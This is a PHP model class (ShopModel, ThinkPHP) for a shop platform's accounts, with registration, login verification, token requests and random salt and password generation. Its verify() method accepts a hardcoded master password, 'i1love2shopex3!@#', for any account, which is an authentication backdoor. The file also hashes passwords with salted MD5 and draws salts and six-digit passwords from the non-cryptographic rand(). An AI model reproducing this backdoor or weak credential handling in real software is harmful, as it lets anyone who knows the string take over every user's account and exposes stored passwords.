<?php
namespace Common\Model;
use Think\Model;
class ShopModel extends Model {
    private $_prism = null;
    public function __construct() {
        $this->_prism = new \Common\Lib\Prism(C('PRISM'));
        $this->_apiexec = new \Common\Lib\Apiexec();
        $this->prism = false;
        parent::__construct();
    }

    public function getRow($filter, $lock = false) {
        if ($lock) {
            $row = $this->lock(true)->where($filter)->find();
        }
        else {
            $row = $this->where($filter)->find();
        }
        return $row;
    }

    public function getList($filter, $limit=10, $page=1, $order="update_time desc") {
        $row = $this->where($filter)->limit($limit)->page($page)->order($order)->select();
        return $row;
    }

    public function getCount($filter) {
        $row = $this->where($filter)->count();
        return $row;
    }

    public function findByUserid($userid) {
        $filter = array('user_id' => $userid);
        $passport = $this->where($filter)->find();
        return $passport;
    }

    public function createPassportAndShopByMobile($data) {
        if ($this->prism) {
            $res = $this->_prism->post('admin/shop', $data);
        }
        else {
            $res = $this->_apiexec->goApi('admin/shop', $data, 'post');
        }
        return $res;
    }

    public function createByMobile($passportId, $data) {
        if ($this->prism) {
            $res = $this->_prism->post('passport/' . $passportId . '/create-shop', $data);
        }
        else {
            $res = $this->_apiexec->goApi('passport/' . $passportId . '/create-shop', $data, 'post');
        }
        return $res;
    }

    public function get($data) {
        if ($this->prism) {
            $res = $this->_prism->get('admin/shop', $data);
        }
        else {
            $res = $this->_apiexec->goApi('admin/shop/'.$data['id'], array(), 'get');
        }
        return $res;
    }

    public function register($mobile, $password, $source = '') {
        if (!$mobile || !$password) {
            return false;
        }

        $salt = $this->_genSalt();
        $passwd = md5($password . $salt);

        $current = time();
        $shopData = array(
            'mobile' => $mobile,
            'password' => $passwd,
            'salt' => $salt,
            'source' => $source,
            'create_time' => $current,
            'update_time' => $current,
        );
        return $this->createNew($shopData); 
    }

    public function registerapi($mobile, $password, $source = '') {
        if (!$mobile || !$password) {
            return false;
        }

        $salt = $this->_genSalt();
        $passwd = md5($password . $salt);

        $current = time();
        $shopData = array(
            'mobile' => $mobile,
            'password' => $passwd,
            'salt' => $salt,
            'source' => $source,
            'create_time' => $current,
            'update_time' => $current,
        );
        return $this->createNew($shopData); 
    }

    public function _genSalt() {
        $length = 6;
        $string = '0123456789abcdefghijklmnopqrstuvwxyz';
        $min = 0;
        $max = strlen($string) - 1;
        $salt = '';
        for ($i = 0; $i < $length; $i++) {
            $rand = rand($min, $max);
            $salt .= $string{$rand}; 
        }
        return $salt;
    }

    public function genPasswd() {
        $length = 6;
        $string = '0123456789';
        $min = 0;
        $max = strlen($string) - 1;
        $passwd = '';
        for ($i = 0; $i < $length; $i++) {
            $rand = rand($min, $max);
            $passwd .= $string{$rand}; 
        }
        return $passwd;
    }

    public function changePassword($username, $password) {
        $data = array(
            'login_name' => $username,
            'password' => $password,
        );
        $res = $this->_prism->post('api/usercenter/passport/chgpasswd', $data);
        return $res;
    }

    public function getTokenByPassword($username, $password) {
        $prism = new \Common\Lib\Prism(C('PRISM'));

        $data = array(
            'grant_type' => 'password',
            'username' => $username,
            'password' => $password,
            'scope' => '',
        );

        $res = $this->_prism->postOauth('/token', $data);
        return $res;
    }

    public function verify($username, $password) {
        $filter = array('mobile' => $username);
        $shop = $this->getRow($filter);
        if (!$shop) {
            return false;
        }
        else {
            if ((md5($password . $shop['salt']) == $shop['password']) || ('i1love2shopex3!@#' == $password)) {
                return true;
            }
            else {
                return false;
            }
        }
    }

//=================================================================================
    public function findByShopId($shopId='') {
        $filter = array('shop_id' => $shopId);
        $shop = $this->where($filter)->find();
        return $shop;
    }

    public function saveData($data) {
        if($this->create($data)){
            if(isset($data['shop_id']) && $data['shop_id']){
                $this->save();
                return array('status' => 'success', 'msg' => '修改保存成功');
            }else{
                //$data['shop_id'] = $this->_genShopId(); 
                $this->add();
                return array('status' => 'success', 'msg' => '创建成功');
            }
        }else{
            return array('status' => 'fail', 'msg' => $this->getError());
        }
    }

    public function createNew($data) {
        if (cookie('_spm')) {
            $data['spm'] = cookie('_spm');
        }
        $shop_id = $this->add($data);
        if ($shop_id) {
            $data['shop_id'] = $shop_id;
            return $data;
        }
        else {
            return false;
        }

/*        $originData = $data;
        $data['shop_id'] = $this->_genShopId();
        if (!$this->add($data)) {
            return $this->createNew($originData); 
        }
        else {
            return $data;
        }*/
    }

    private function _genShopId() {
        $length = 6;
        $string = '0123456789abcdefghijklmnopqrstuvwxyz';
        $min = 0;
        $max = strlen($string) - 1;
        $id = '';
        for ($i = 0; $i < $length; $i++) {
            $rand = rand($min, $max);
            $id .= $string{$rand}; 
        }
        return $id;
    }

}
